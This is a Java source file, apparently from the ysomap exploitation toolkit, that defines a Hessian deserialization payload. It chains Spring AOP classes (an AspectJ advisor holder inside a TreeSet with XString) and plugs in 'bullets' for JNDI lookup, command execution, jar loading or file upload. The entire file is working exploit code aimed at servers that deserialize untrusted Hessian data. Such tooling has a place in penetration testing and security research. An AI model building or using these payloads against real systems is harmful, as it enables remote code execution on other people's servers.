package ysomap.payloads.hessian;

import org.springframework.aop.aspectj.AbstractAspectJAdvice;
import org.springframework.aop.aspectj.AspectInstanceFactory;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJPointcutAdvisor;
import org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;
import ysomap.bullets.Bullet;
import ysomap.bullets.spring.SpringJndiBullet1;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

@Payloads
@Authors({ Authors.MBECHLER })
@Targets({Targets.HESSIAN})
@Require(bullets = {"SpringJndiBullet1", "SpringExecBullet", "SpringLoadJarBullet", "SpringUploadBullet"},param = false)
@Dependencies({"org.springframework:spring-context","org.springframework:spring-aop"})
public class SpringPartiallyComparableAdvisorHolder extends HessianPayload {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return SpringJndiBullet1.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        AspectInstanceFactory aif = ReflectionHelper.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
        ReflectionHelper.setFieldValue(aif, "beanFactory", obj);
        ReflectionHelper.setFieldValue(aif, "name", bullet.get("beanName"));
        AbstractAspectJAdvice advice = ReflectionHelper.createWithoutConstructor(AspectJAroundAdvice.class);
        ReflectionHelper.setFieldValue(advice, "aspectInstanceFactory", aif);

        // make readObject happy if it is called
        ReflectionHelper.setFieldValue(advice, "declaringClass", Object.class);
        ReflectionHelper.setFieldValue(advice, "methodName", "toString");
        ReflectionHelper.setFieldValue(advice, "parameterTypes", new Class[0]);

        AspectJPointcutAdvisor advisor = ReflectionHelper.createWithoutConstructor(AspectJPointcutAdvisor.class);
        ReflectionHelper.setFieldValue(advisor, "advice", advice);

        Class<?> pcahCl = Class
                .forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
        Object pcah = ReflectionHelper.createWithoutConstructor(pcahCl);
        ReflectionHelper.setFieldValue(pcah, "advisor", advisor);
        return PayloadHelper.makeTreeSetWithXString(pcah);
    }
}
